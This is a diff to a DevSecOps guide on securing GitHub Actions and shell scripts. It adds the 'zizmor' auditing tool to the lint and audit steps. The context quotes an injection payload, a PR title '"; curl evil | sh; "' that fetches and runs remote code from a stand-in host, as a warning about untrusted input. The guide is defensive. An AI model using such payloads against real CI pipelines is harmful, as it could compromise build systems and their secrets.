@@ -31,8 +31,9 @@ script *before* the shell parses it — a PR title of `"; curl evil | sh; "` exe
 ```
 
 Treat ALL `github.event.*`, branch names, commit messages, issue/PR text as attacker-
-controlled. Lint with `actionlint` (embeds ShellCheck for run blocks). Full taxonomy →
-`sota-devsecops`.
+controlled. Lint with `actionlint` (embeds ShellCheck for run blocks) and audit with
+`zizmor` (template injection, credential persistence, excessive permissions). Full
+taxonomy → `sota-devsecops`.
 
 **Multiline `run:` blocks**: each step is one script — a failing middle line only stops
 the step because of `-e`; verify the effective shell options for your CI (GitLab uses
@@ -160,8 +161,8 @@ exec > >(stdbuf -oL tee -a "$logfile") 2>&1
       default shell semantics → MEDIUM.
 - [ ] `>> "$GITHUB_OUTPUT"` / `$GITHUB_ENV` writes of non-constant values without heredoc
       delimiters → HIGH.
-- [ ] Run `actionlint` (embeds ShellCheck) on workflows; `hadolint` on Dockerfiles
-      (DL4006 pipefail-in-RUN, SC-rules inside RUN).
+- [ ] Run `actionlint` (embeds ShellCheck) and `zizmor` on workflows; `hadolint` on
+      Dockerfiles (DL4006 pipefail-in-RUN, SC-rules inside RUN).
 - [ ] Entrypoints: `grep -rn '"\$@"\|exec ' docker/ *entrypoint*` — final command lacking
       `exec` → HIGH (signal loss); `su -c`/`sudo` for privilege drop instead of
       gosu/su-exec/USER → HIGH.
